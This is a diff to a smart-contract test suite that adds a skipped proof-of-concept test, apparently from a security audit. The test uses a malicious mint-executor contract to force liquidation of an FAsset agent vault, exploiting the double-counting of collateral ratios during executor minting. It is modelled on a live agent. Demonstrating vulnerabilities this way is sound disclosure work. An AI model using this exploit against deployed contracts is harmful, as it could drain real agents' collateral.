@@ -1,5 +1,5 @@
 import { expectRevert } from "@openzeppelin/test-helpers";
-import { toBNExp, toWei } from "../../../lib/utils/helpers";
+import { toBN, toBNExp, toWei } from "../../../lib/utils/helpers";
 import { MockChain } from "../../utils/fasset/MockChain";
 import { MockFlareDataConnectorClient } from "../../utils/fasset/MockFlareDataConnectorClient";
 import { getTestFile, loadFixtureCopyVars } from "../../utils/test-helpers";
@@ -209,5 +209,74 @@ contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulation
             "only asset manager");
         // close vault should work now
         await agent.exitAndDestroy();
+    });
+
+    it.skip("nnez-force-liquidation", async () => {
+        // Vault collateral is USDC, 18 decimals
+        // USDC price - 1.01
+        // NAT price - 0.42
+        // BTC price - 25213
+        // System CR
+        // - minCollateralRatio for vault is 1.4
+        // - minCollateralRatio for pool is 2.0
+        // Agent CR
+        // - mintingVaultCollateralRatioBIPS: toBIPS(2.0)
+        // - mintingPoolCollateralRatioBIPS: toBIPS(2.0)
+        // To mimic live agent: https://fasset.oracle-daemon.com/sgb/pools/FDOGE/0x2C919bA9a675c213f5e52125933fdD8854714F53
+
+        const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1,
+            { mintingVaultCollateralRatioBIPS: 20_000, mintingPoolCollateralRatioBIPS: 20_000 });
+        const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.underlyingAmount(10000));
+        let agentInfo;
+
+        // [1] Make agent available and deposits some collateral
+        await agent.depositCollateralsAndMakeAvailable(toBNExp(400000, 18), toBNExp(1000000, 18));
+        // mine some blocks to skip the agent creation time
+        mockChain.mine(5);
+        // update block
+        await context.updateUnderlyingBlock();
+        await context.assetManager.currentUnderlyingBlock();
+
+        // [2] Set up executor exploit contract
+        const executorFee = toBN(1000000000);
+        const executorFactory = artifacts.require("MaliciousMintExecutor");
+        const executorInstance = await executorFactory.new(context.assetManager.address, agent.agentVault.address, minter.address, context.fAsset.address);
+        const executor = executorInstance.address;
+        // [3] Minter approves explolit contract to spend minted FAsset
+        await context.fAsset.approve(executor, toBNExp(10000000, 18), { from: minter.address });
+
+        // [4] Perform minting
+        // lotSize = 2
+        // underlying chain = BTC
+        agentInfo = await agent.getAgentInfo();
+        const lots = agentInfo.freeCollateralLots; // mint at maximum available
+        console.log(">> reserve collateral, lots=", lots);
+        const crt = await minter.reserveCollateral(agent.vaultAddress, lots, executor, executorFee);
+        console.log(">> perform payment to agent underlying address");
+        const txHash = await minter.performMintingPayment(crt);
+
+        agentInfo = await agent.getAgentInfo();
+        console.log("free lots: ", agentInfo.freeCollateralLots.toString());
+        console.log("vaultCR after reservation: ", agentInfo.vaultCollateralRatioBIPS);
+        console.log("poolCR after reservation: ", agentInfo.poolCollateralRatioBIPS);
+
+        // [5] Exploit
+        agentInfo = await agent.getAgentInfo();
+        console.log("agent vault collateral in wei before exploit: ", agentInfo.totalVaultCollateralWei);
+        console.log(">>> executor call executeMinting");
+        const proof = await context.attestationProvider.provePayment(txHash, minter.underlyingAddress, crt.paymentAddress);
+        await executorInstance.mint(proof, crt.collateralReservationId);
+
+        // [6] Post-expolitation, observe that vault collateral is reduced due to liquidation
+        // Also, observe that vaultCR and poolCR is reduced due to double counting while it should be the same as in after reservation
+        agentInfo = await agent.getAgentInfo();
+        console.log("agent vault collateral in wei after exploit: ", agentInfo.totalVaultCollateralWei);
+        console.log("vaultCR while in executor call: ", (await executorInstance.vaultCR()).toString());
+        console.log("poolCR while in executor call: ", (await executorInstance.poolCR()).toString());
+
+        agentInfo = await agent.getAgentInfo();
+        console.log("free lots: ", agentInfo.freeCollateralLots.toString());
+        console.log("vaultCR after exploit: ", agentInfo.vaultCollateralRatioBIPS);
+        console.log("poolCR after exploit: ", agentInfo.poolCollateralRatioBIPS);
     });
 });
